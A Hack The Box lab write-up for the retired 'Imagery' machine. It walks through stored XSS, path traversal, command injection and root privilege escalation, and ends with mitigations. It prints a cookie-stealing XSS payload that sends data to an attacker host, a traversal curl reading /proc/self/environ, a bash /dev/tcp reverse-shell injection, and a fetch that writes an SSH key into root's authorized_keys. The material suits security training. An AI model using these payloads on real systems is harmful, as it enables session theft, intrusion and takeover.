---
machine: Imagery
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, xss, lfi, command-injection, privesc]
---

# Imagery — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The Flask gallery accepts “bug reports”. The `details` field is inserted into the admin panel without `DOMPurify`, so a stored XSS steals the admin session cookie, which lacks `HttpOnly`. That session reaches `/admin/get_system_log`, vulnerable to directory traversal: it reads the source and `/proc/self/environ`, where `CRON_BYPASS_TOKEN` appears. Source analysis reveals command injection in `/apply_visual_transform`, but only for `testuser`; its MD5 hash is in `db.json` and cracks. The shell runs as `web`. A `pyAesCrypt` backup in `/var/backup` contains `mark`'s password, and `mark` can run `charcol` as root: its `fetch` option writes an SSH key to `/root/.ssh/authorized_keys`.

## Recon

```bash
nmap -Pn -sCV -p22,8000 <IP>
```

- `22` OpenSSH 9.7p1 Ubuntu.
- `8000` Werkzeug/3.1.3, Python 3.12.7, Flask exposed directly.

The app allows registration, image uploads and a bug report from the footer. The Flask session cookie lacks `HttpOnly` and decodes fields such as `isAdmin`.

## Enumeration

`feroxbuster` finds `/images`, `/upload_image`, `/login`, `/register` and `/logout`. The admin panel fetches `/admin/bug_reports` and builds cards with `innerHTML`; `report.details` does not pass through `DOMPurify`.

Submit:

```html
<img src=x onerror=fetch('http://<ATTACKER>/?c='+document.cookie)>
```

The administrator reviews reports periodically and the cookie reaches the listener. Decoded, `isAdmin` is `true`.

## Foothold

With the stolen cookie, open the admin panel. The “Download Log” button calls:

```text
/admin/get_system_log?log_identifier=<username>.log
```

The parameter accepts traversal. Use `curl --path-as-is` to read `/proc/self/environ`, `app.py` and the `api_*.py` modules:

```bash
curl --path-as-is -b "session=<COOKIE>" \
  'http://<IP>:8000/admin/get_system_log?log_identifier=../../../../proc/self/environ' \
  --ignore-content-length -s | tr '\000' '\n'
```

The environment confirms the `web` user, the virtualenv and a `CRON_BYPASS_TOKEN`. `api_edit.py` shows `/apply_visual_transform` using `subprocess.run(..., shell=True)` with unsanitised `width`, `height`, `x` and `y`. The route requires `session['is_testuser_account']`.

`db.json` contains MD5 hashes for `admin`, `testuser` and the registered user. `testuser`'s hash cracks; log in as `testuser@imagery.htb` and upload an image.

## Lateral movement

Send a “crop” transformation with the injection in `y`:

```json
{"imageId":"<ID>","transformType":"crop",
 "params":{"x":"0","y":"0; bash -c 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1'","width":"10","height":"10"}}
```

The shell runs as `web`. `/var/backup` holds a pyAesCrypt 6.1.1 `.zip.aes`; exfiltrate it and crack it with `pyAesBrute` and `rockyou.txt`. The ZIP contains an older `db.json` with `mark`'s hash; once cracked, the password works with `su - mark` (SSH has `PasswordAuthentication no`).

## Privilege escalation

`mark` can run `/usr/local/bin/charcol` as root without a password. `charcol -R shell` asks for `mark`'s password and resets the application to “no password” mode. The `fetch` command then downloads a URL and writes the result owned by root:

```text
charcol> fetch http://<ATTACKER>/id_ed25519.pub -o /root/.ssh/authorized_keys
```

Log in with the private key:

```bash
ssh -i id_ed25519 root@<IP> -t sh
```

The alternative is `auto add`, creating a cron job that copies `bash` and sets the setuid bit.

## Evidence

- Bug report with `<img onerror>` and the admin cookie received.
- Decoded cookie with `isAdmin: true`.
- `/proc/self/environ` and `api_edit.py` read through traversal.
- Crop request with `ping`/reverse shell and a shell as `web`.
- Decrypted backup and `su - mark`.
- `charcol fetch` writing to `/root/.ssh/authorized_keys` and `id` as root.

## Lessons learned

- Sanitising some fields but not others leaves stored XSS in the admin panel.
- A cookie without `HttpOnly` turns XSS into session theft.
- A filename parameter can be traversal even when the endpoint is called “log”.
- Leaked source reveals hidden routes and bypass tokens.
- A backup tool that writes as root can become arbitrary file write.

## Mitigations and detection

- Sanitise `details` on the server and client; use `textContent` instead of `innerHTML`.
- Mark session cookies `HttpOnly`, `Secure` and `SameSite`.
- Resolve paths with `realpath` and keep them inside a log directory.
- Avoid `shell=True`; pass argument lists and validate numbers.
- Run `charcol` without setuid and restrict `fetch` to allowlisted destinations.
- Detect `../` requests, XSS in bug reports, `subprocess` metacharacters and writes to `/root/.ssh`.

## References

- [0xdf — Imagery](https://0xdf.gitlab.io/2026/01/24/htb-imagery.html)
- [IppSec — Imagery](https://www.youtube.com/watch?v=4sMXhZiNjDE)
- [Hack The Box — Imagery](https://app.hackthebox.com/machines/imagery)
